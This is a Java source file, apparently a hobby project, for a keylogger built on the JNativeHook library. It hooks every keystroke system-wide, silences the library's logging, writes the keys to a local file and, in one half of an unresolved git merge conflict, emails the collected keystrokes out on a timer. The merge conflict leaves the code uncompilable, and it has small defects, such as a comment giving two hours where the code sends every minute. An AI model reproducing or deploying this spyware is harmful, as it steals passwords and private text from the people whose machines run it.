/*
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
// https://stackoverflow.com/questions/30560212/how-to-remove-the-logging-data-from-jnativehook-library
*/

package main;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

class Main implements NativeKeyListener {
    private static String emailStr = ""; // holds email contents

    public Main() {
        // disables logging of keystrokes in the output
        // Clear previous logging configurations.
        LogManager.getLogManager().reset();

        // Get the logger for "org.jnativehook" and set the level to off.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
    }

    public static void main(String[] args) {
        GlobalScreen.addNativeKeyListener(new Main());

        try {
            File file = new File("output-file.txt");
            FileOutputStream fos = new FileOutputStream(file, true);
            System.setOut(new PrintStream(fos));
        } catch (FileNotFoundException var4) {
            var4.printStackTrace();
        }

<<<<<<< Updated upstream
        try {
            //Sender.sendEmail("Testing");
            // System.out.println("EMAIL SENT!");
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException var3) {
            var3.printStackTrace();
        } catch (Throwable e) {
            e.printStackTrace();
        }
=======
        TimerTask mailingTask = new TimerTask() {
            @Override
            public void run() {
                if (emailStr != "") {                   // send email if not empty
                    try {
                        Sender.sendEmail(emailStr);
                        emailStr = "";                  // clear email contents
                        GlobalScreen.registerNativeHook();
                    } catch (NativeHookException var3) {
                        var3.printStackTrace();
                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                }
            }
        };


        Timer timer = new Timer("timer");
        long delay = 1000L;

        //how often mail is sent (2 hours)
        long period = 1000 * 60;

        timer.scheduleAtFixedRate(mailingTask, delay, period);
>>>>>>> Stashed changes
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String temp = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.print(temp);
        emailStr += temp;
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent arg0) {
    }
}
